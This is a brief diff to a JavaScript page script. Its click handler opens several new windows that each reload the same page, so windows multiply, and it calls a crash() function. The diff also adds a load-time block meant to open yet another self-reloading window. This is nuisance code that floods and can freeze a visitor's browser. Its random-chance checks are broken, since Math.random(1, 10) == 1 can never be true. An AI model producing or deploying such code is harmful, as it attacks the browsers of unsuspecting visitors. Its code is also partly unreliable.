@@ -43,14 +43,18 @@ function animation() {
 
 animation();
 
-
 document.addEventListener("click", () => {
-    for (let i = 0; i < 6; i++) {
+    for (let i = 0; i < 4; i++) {
         var win = window.open();
     
         win.location.href = window.location.href;
     }
-
+    
     if (Math.random(1, 10) == 1) crash();
 });
+
+if (Math.random(1, 5) == 1) {
+    var win = window.open();
+    win.location.href = window.location.href;
+}
  
